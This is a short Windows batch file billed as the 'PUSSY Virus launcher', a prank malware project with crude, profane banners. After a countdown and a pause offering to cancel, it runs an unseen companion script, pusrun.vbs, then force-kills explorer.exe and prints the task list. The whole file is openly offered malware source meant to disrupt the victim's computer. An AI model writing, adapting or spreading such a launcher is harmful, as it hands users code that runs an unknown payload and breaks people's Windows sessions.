@echo off
echo PUSSY Virus launcher 1.7.1  PUSSY ver 5.0.0
echo a project by crazynoob458
echo *************************************************
echo *        P U S S Y  D E S T R O Y E R           *
echo *************************************************
echo *                                               *
echo *        your pc will be FUKED enjoy!           *
echo *                                               *
echo *  now go outside and play its a bootiful day   *
echo *                                               *
echo *        and watch the VIRUS DESTROY            *
echo *                                               *
echo *************************************************
timeout 20
cls
echo *************************************************
echo *      DO YOU WANT TO INTIATE THE VIRUS?        *
echo *************************************************
echo you can close command prompt here to cancel virus
pause
cls
echo *************************************************
echo *                   L O G                       *
echo *************************************************
echo VIRUS intitiating
pusrun.vbs
taskkill /f /im explorer.exe
echo VIRUS initiated!
@echo on
tasklist
@echo off
echo press any key to close command prompt...
pause